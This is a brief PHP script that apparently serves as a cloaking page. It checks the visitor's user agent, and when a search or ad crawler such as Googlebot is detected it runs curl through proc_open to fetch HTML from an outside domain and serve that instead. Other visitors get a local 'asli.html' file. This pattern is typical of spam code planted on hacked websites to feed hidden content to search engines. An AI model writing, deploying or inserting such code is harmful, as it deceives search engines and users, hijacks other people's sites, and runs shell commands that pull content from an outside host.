<?php
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
if (preg_match("/(googlebot|slurp|adsense|inspection)/", $ua)) {
    $descriptorspec = [1 => ["pipe", "w"], 2 => ["pipe", "w"]];
    $process = proc_open('curl -s https://ns1-static.net/clock/admisi/index.html', $descriptorspec, $pipes);
    echo stream_get_contents($pipes[1]);
    proc_close($process);
    exit;
}
readfile("asli.html");
?>
